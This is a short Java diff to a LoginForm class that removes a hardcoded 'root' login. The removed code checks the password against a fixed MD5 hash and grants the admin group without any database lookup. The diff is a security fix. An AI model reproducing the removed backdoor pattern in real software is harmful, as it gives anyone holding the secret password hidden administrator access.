@@ -76,26 +76,7 @@ public class LoginForm {
 		if (login == null) {
 			Helper.setFehlerMeldung("login", "", Helper.getTranslation("wrongLogin"));
 		} else {
-			if (login.equals("root")) {
-				String pwMD5 = new MD5(passwort).getMD5();
-				if (pwMD5.equals("c01dc87e699e49cba16cf22f99eec00c")) {
-					Benutzer b = new Benutzer();
-					b.setLogin("root");
-					try {
-						Benutzergruppe admin = new BenutzergruppenDAO().get(1);
-						Set<Benutzergruppe> l = new HashSet<Benutzergruppe>();
-						l.add(admin);
-						b.setBenutzergruppen(l);
-						myBenutzer = b;
-					} catch (DAOException e) {
 
-					}
-					// b.setBenutzergruppen(benutzergruppen)
-				} else {
-					Helper.setFehlerMeldung("login", "", Helper.getTranslation("wrongLogin"));
-				}
-				return "";
-			}
 			/* prüfen, ob schon ein Benutzer mit dem Login existiert */
 			// TODO: Use generics.
 			List<Benutzer> treffer;
